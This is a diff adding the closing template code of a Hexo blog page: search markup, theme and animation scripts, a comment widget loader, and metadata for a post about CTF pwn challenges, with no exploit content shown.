+        <div class="sidebar-common-btn"></div>
+      </div>
+</nav>
+
+    </div>
+      <div class="site-search">
+        <div class="reimu-popup popup">
+          <div class="reimu-search">
+            <div class="reimu-search-input-icon"></div>
+            <div id="reimu-search-input"></div>
+            <div class="popup-btn-close"></div>
+          </div>
+          <div class="reimu-results">
+            <div id="reimu-stats"></div>
+            <div id="reimu-hits"></div>
+            <div id="reimu-pagination" class="reimu-pagination"></div>
+          </div>
+          <img class="reimu-bg" src="/HFTTC.github.io/images/reimu.png" loading="lazy" decoding="async" fetchpriority="low"/>
+        </div>
+      </div>
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="/HFTTC.github.io/js/lazyload-local.js"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+
+<script src="/HFTTC.github.io/js/script.js"></script>
+
+
+  
+<script src="/HFTTC.github.io/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+<script src="/HFTTC.github.io/js/pjax_script.js" data-pjax></script>
+
+
+  
+<script src="/HFTTC.github.io/js/generator_search.js" defer></script>
+
+
+
+  <script>
+    var setupFirework = () => {
+      if (!false || !window.matchMedia('(max-width: 768px)').matches) {
+        window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["var(--red-1)","var(--red-2)","var(--red-3)","var(--red-4)"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["var(--red-0)"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'));
+      }
+    }
+  </script>
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.2.0/dist/index.umd.js" integrity="sha384-qi9WggRt19tv8Vc7pCHW3ulMNLwrn515zaLEWZjl1px07vz8+pUoWX8n1rgq282T" crossorigin="anonymous" onload="setupFirework()" defer></script>
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "HFTTC",
+          title: "湾区杯 2025 PWN",
+          url: "https://idcm-svg.github.io/HFTTC.github.io/2026/08/17/%E6%B9%BE%E5%8C%BA%E6%9D%AF2025-pwn/",
+          excerpt: "",
+          description: "",
+          stripContent: "前言：大概快一个多月没有打过堆风水的题目了，期间或许偶尔碰见那么一两道吧，也都比较简单。国外的比赛经常给一些异构 pwn 或者某些偏于真实的程序，大部分都是篡改指针，然后反复跳转，难点在于读懂程序，最近国内比赛多起来了，开始复现国内的题目发现大部分都是堆风水，然后典型的堆覆盖泄露 libc 然后打 apple2 之类的，感觉长时间不写有点退化了，像湾区杯的 armpwn 也是在写题过程中学到了不少知识。 digtal_bomb：  2.35 版本的 libc，开启了 canary，pie 和 F",
+          date: "Mon Aug 17 2026 00:00:00 GMT+0800",
+          updated: "Mon Aug 17 2026 01:24:12 GMT+0800",
+          cover: "/HFTTC.github.io/images/pwn/covers/wanqubei-2025-pwn.jpg",
+        };
+      </script>
+        
+<script src="/HFTTC.github.io/js/insert_highlight.js" data-pjax></script>
+
+      
+<script src="/HFTTC.github.io/js/tabs.js" data-pjax defer></script>
+
+      <script type="module" data-pjax>
+        (async () => {
+          const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+          const initPswp = (gallery, children) => {
+            if (_$$(`${gallery} ${children}`).length > 0) {
+              new PhotoSwipeLightbox({
+                gallery,
+                children,
+                pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+              }).init();
+            }
+          }
+          const pswp = () => {
+            initPswp('.article-entry', 'a.article-gallery-item');
+            initPswp('.article-gallery', 'a.article-gallery-item');
+          }
+          pswp();
+        })();
+      </script>
+        
+
+<script data-pjax>
+  var loadScript = (src, integrity) => {
+    const script = document.createElement('script');
+    script.src = src;
+    if (integrity) script.integrity = integrity;
+    script.crossOrigin = 'anonymous';
+    return script;
+  };
+
+  var commentConfigKeys = ["utterances"];
+  var commentConfig = {
+    utterances: {
+      enable: true,
+      load: () => {
+        const container = document.querySelector('.utterances-comment'); 
+        if (!container) return;
+        container.style.display = 'block';
+
+        let theme = 'auto';
+        const parsedTheme = theme === 'auto' ? (document.documentElement.getAttribute('data-theme') === 'dark' ? 'github-dark' : 'github-light') : theme;
+
+        // 创建 utterances 脚本
+        const script = document.createElement('script');
+        script.src = 'https://utteranc.es/client.js';
+        script.setAttribute('repo', 'IDCM-svg/HFTTC.github.io');
+        script.setAttribute('issue-term', 'pathname');
+        script.setAttribute('theme', parsedTheme);
+        script.setAttribute('crossorigin', 'anonymous');
+        script.async = true;
+
+        // 清空容器（防止重复加载）并插入脚本
+        container.innerHTML = '';
+        container.appendChild(script);
+        if (theme === 'auto') {
+          const themeHandler = (e) => {
+            const iframe = container.querySelector('iframe.utterances-frame');
+            if (!iframe || !iframe.contentWindow) {
+              document.body.removeEventListener('reimu:theme-set', themeHandler);
+              return;
+            }
+            iframe.contentWindow.postMessage({ type: 'set-theme', theme: e.detail.isDark ? 'github-dark' : 'github-light' }, 'https://utteranc.es');
+          };
+          document.body.addEventListener('reimu:theme-set', themeHandler);
+        }
+      }
+    },
+  }
+  commentConfig.enable = commentConfigKeys.some(key => commentConfig[key].enable);
+
+  var defaultComment = '';
+  if (commentConfig.enable) {
+    // 1. 首先检查localStorage中是否有保存的评论类型
+    var savedCommentType = localStorage.getItem('commentType');
+    
+    // 2. 如果localStorage中有值且对应的评论系统可用，就使用它
+    if (savedCommentType) {
+      if (commentConfig[savedCommentType]?.enable) {
+        defaultComment = savedCommentType;
+      }
+    }
+    
+    // 3. 如果localStorage无效，检查配置的默认评论系统
+    if (!defaultComment) {
+      var configDefault = 'utterances';
+      if (commentConfig[configDefault]?.enable) {
+        defaultComment = configDefault;
+      }
+    }
+    
+    // 4. 如果前两项都无效，按指定顺序找到第一个可用的评论系统
+    if (!defaultComment) {
+      defaultComment = commentConfigKeys.find(sys => commentConfig[sys].enable) || '';
+    }
+  }
+  function loadComments() {
+    if (!commentConfig.enable) return;
+    const loadedComments = {
+      valine: false,
+      waline: false,
+      twikoo: false,
+      gitalk: false,
+      giscus: false,
+      utterances: false,
+      beaudar: false,
+      disqus: false,
+    };
+
+    // 隐藏所有评论容器
+    const hideAllComments = () => {
+      const commentContainers = document.querySelectorAll('.comment');
+      commentContainers.forEach(container => {
+        container.style.display = 'none';
+      });
+    };
+
+    // 按需加载评论系统
+    const loadCommentSystem = (type) => {
+      if (loadedComments[type]) {
+        // 如果已加载，只需显示对应容器
+        document.querySelector(`.${type}-comment`).style.display = 'block';
+        return;
+      }
+
+      // 根据类型加载对应的脚本
+      commentConfig[type]?.load();
+      loadedComments[type] = true;
+    };
+
+    // 评论组件选择器
+    const changeActiveCommentItems = (item) => {
+      const commentItems = document.querySelectorAll('.selector-item');
+      for (let i = 0; i < commentItems.length; i++) {
+        commentItems[i].classList.remove('active');
+      }
+      item.classList.add('active');
+
+      // 获取要加载的评论系统类型
+      const commentType = item.getAttribute('data-selector');
+
+      // 隐藏所有评论系统
+      hideAllComments();
+
+      // 加载选中的评论系统
+      loadCommentSystem(commentType);
+    };
+
+    const commentInit = () => {
+      // 评论组件选择器点击事件
+      const commentItems = document.querySelectorAll('.selector-item');
+      for (let item of commentItems) {
+        item.addEventListener('click', () => {
+          // 保存选择器状态
+          const commentType = item.getAttribute('data-selector');
+          window.localStorage.setItem('commentType', commentType);
+          // 切换选中状态
+          changeActiveCommentItems(item);
+        });
+      }
+
+      // 检查是否需要加载默认评论系统
+      if (defaultComment) {
+        const defaultSelectorItem = document.querySelector(`[data-selector="${defaultComment}"]`);
+        if (!defaultSelectorItem) return;
+        defaultSelectorItem.style.display = 'block';
+        defaultSelectorItem.classList.add('active');
+        loadCommentSystem(defaultComment);
+      }
+    }
+
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', commentInit);
+    } else {
+      commentInit();
+    }
+  };
+  loadComments();
+</script>
+
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.12.3' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    Promise.all([
+      navigator.serviceWorker.getRegistrations().then((registrations) => {
+        return Promise.all(registrations.map((registration) => registration.unregister()));
+      }),
+      ('caches' in window)
+        ? caches.keys().then((keys) => Promise.all(keys.map((key) => caches.delete(key))))
+        : Promise.resolve()
+    ]).then(() => {
+      if (!sessionStorage.getItem('sw-cache-cleared')) {
+        sessionStorage.setItem('sw-cache-cleared', '1');
+        window.location.reload();
+      }
+    });
+  }
+</script>
+
+
+
+
+  </body>
+  </html>
